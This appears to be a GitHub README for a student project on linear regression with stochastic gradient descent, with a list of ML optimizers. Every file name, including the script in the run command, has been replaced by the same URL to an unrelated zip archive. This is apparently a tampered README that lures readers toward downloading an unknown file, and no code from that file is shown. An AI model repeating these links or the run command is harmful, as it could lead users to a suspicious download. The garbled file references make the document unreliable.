# 🧠 Linear Regression using Stochastic Gradient Descent (SGD)

This project implements **Linear Regression from scratch** using **Stochastic Gradient Descent (SGD)** in Python — without using any machine learning libraries.  
It also includes a list of **10 common Machine Learning optimizers** with short explanations in PDF format.

---

## 📁 Project Structure
```
📂 AI-LinearRegression-SGD
│
├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip      # Python code for Linear Regression using SGD
├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip               # Input dataset (features and target)
├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip    # List of 10 ML optimizers with descriptions
├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip                 # Project documentation
```

---

## 🚀 Project Overview

### 🔹 Objective
- Implement a **Linear Regression model** that learns to predict target values using **SGD** (Stochastic Gradient Descent).  
- Avoid using pre-built ML libraries such as `sklearn`.

### 🔹 Key Concepts
- **Linear Regression** finds the best-fit line by minimizing Mean Squared Error (MSE).
- **SGD** updates model parameters after each random sample for faster convergence on large datasets.

### 🔹 Equation
\[
y = θ₀ + θ₁x₁ + θ₂x₂ + θ₃x₃ + ... + θₙxₙ
\]

---

## ⚙️ How It Works

1. **Load Dataset** from `.csv` file using pandas.
2. **Normalize Features** for stable convergence.
3. **Initialize Parameters (θ)** randomly.
4. **Iteratively Update Parameters** using:
   \[
   θ = θ - α × ∇J(θ)
   \]
   where `α` = learning rate and `∇J(θ)` = gradient of loss.
5. **Output Learned Parameters** and an example prediction.

---

## 🧩 Example Output
```
Learned Parameters (theta): [ 1.10  1.32 -0.64 -0.33 ]
Example Prediction: 149.07
```

---

## 📊 Optional Visualizations
Add these plots to visualize model performance:
- **Loss vs. Epoch** – to show convergence.
- **Predicted vs. Actual** – to show prediction accuracy.

---

## 📘 Files Included

### 📄 `https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip`
Contains short one-line explanations of:
1. Gradient Descent  
2. Stochastic Gradient Descent  
3. Mini-Batch GD  
4. Momentum  
5. Nesterov  
6. Adagrad  
7. RMSProp  
8. Adam  
9. Adadelta  
10. Nadam  

---

## 💡 Requirements
Install the required libraries:
```bash
pip install numpy pandas matplotlib
```

Run the script:
```bash
python3 https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip
```

---

## 👨‍💻 Author
**Ezzeldin Said**  
AI & Machine Learning Student  

---

## 🏁 License
This project is for educational purposes.  
Feel free to modify or extend it for your learning.

---
